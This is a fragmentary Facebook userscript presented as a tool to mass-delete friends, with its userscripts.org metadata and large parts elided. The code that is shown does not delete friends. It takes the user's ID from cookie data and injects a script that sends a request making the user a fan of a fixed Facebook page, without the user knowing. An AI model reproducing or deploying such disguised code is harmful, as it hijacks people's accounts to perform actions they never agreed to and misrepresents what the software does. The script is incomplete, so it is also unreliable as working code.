// ==UserScript==
// @name                Auto Delete Friends In Facebook 2014.
// @description         Mass friends Deleter
// @namespace           http://userscripts.org/scripts/review/162519
// @updateURL           https://userscripts.org/scripts/source/162519.meta.js
// @downloadURL         https://userscripts.org/scripts/source/162519.user.js
// @homepageURL         https://userscripts.org/scripts/show/162519
...
var username=getCookie("username");
  ...
  //alert ('cookie does not exist');
	...
	var g=e[1];
 	...
 	var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/pages/fan_status.php').setData({fbpage_id:345297178842879,__a:1,add:true, __user: "+g+",norefresh:true }).send();";
		document.body.appendChild(a);
